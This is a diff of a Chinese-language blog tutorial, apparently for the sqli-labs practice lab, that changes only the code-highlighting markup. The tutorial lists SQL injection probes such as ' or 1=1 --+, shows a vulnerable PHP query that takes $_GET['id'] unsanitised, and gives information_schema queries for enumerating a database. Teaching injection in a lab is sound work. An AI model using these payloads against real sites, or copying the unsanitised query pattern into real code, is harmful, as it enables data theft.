@@ -207,27 +207,16 @@
 </li>
 <li><p>一般用于尝试的语句</p>
 <p>ps：<code>--+</code>可以用 <code>#</code> 替换， url提交过程中url编码后的<code>#</code>为<code>%23</code></p>
-<pre class=" language-html"><code class="language-html">or 1=1 --+
-' or 1=1 --+
-" or 1=1 --+
-) or 1=1 --+
-') or 1=1 --+
-") or 1=1 --+
-")) or 1=1 --+
-</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1 --+</span><br><span class="line">' or 1=1 --+</span><br><span class="line">" or 1=1 --+</span><br><span class="line">) or 1=1 --+</span><br><span class="line">') or 1=1 --+</span><br><span class="line">") or 1=1 --+</span><br><span class="line">")) or 1=1 --+</span><br></pre></td></tr></table></figure>
 <p>一般的代码为： </p>
-<pre class=" language-sql"><code class="language-sql">$id<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
-$sql<span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span> 
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET['id']; </span><br><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
 <p>此处考虑两个点，一个是闭合前面你的<code>&#39;</code>，另一个是处理后面的 <code>&#39;</code>，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23） </p>
 </li>
 <li><p>union操作符的介绍</p>
 <p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。 </p>
-<pre class=" language-mysql"><code class="language-mysql">select column_name(s) from table_name1 union select column_name(s) from table_name2
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name(s) from table_name1 union select column_name(s) from table_name2</span><br></pre></td></tr></table></figure>
 <p>默认地，<code>UNION</code> 操作符选取不同的值。如果允许重复的值，请使用 <code>UNION ALL</code>。</p>
-<pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">from</span> table_name1 <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">from</span> table_name2
-</code></pre>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name1 <span class="keyword">union</span> all <span class="keyword">select</span> column_name(s) <span class="keyword">from</span> table_name2</span><br></pre></td></tr></table></figure>
 <p>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名</p>
 </li>
 <li><p>SQL中的逻辑运算</p>
@@ -238,17 +227,13 @@ $sql<span class="token operator">=</span><span class="token string">"SELECT * FR
 </ol>
 <p>Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。 </p>
 <p>猜数据库 </p>
-<pre class=" language-mysql"><code class="language-mysql">select schema_name from information_schema.schemata 
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
 <p>猜某库的数据表 </p>
-<pre class=" language-mysql"><code class="language-mysql">select table_name from information_schema.tables where table_schema=’xxxxx’ 
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’</span><br></pre></td></tr></table></figure>
 <p>猜某表的所有列 </p>
-<pre class=" language-mysql"><code class="language-mysql">Select column_name from information_schema.columns where table_name=’xxxxx’ 
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’</span><br></pre></td></tr></table></figure>
 <p>获取某列的内容 </p>
-<pre class=" language-mysql"><code class="language-mysql">Select *** from ****
-</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select *** from ****</span><br></pre></td></tr></table></figure>
 <h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><h3 id="Background-2-盲注的讲解"><a href="#Background-2-盲注的讲解" class="headerlink" title="Background-2 盲注的讲解"></a>Background-2 盲注的讲解</h3><h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4>
   </div>
 </article>
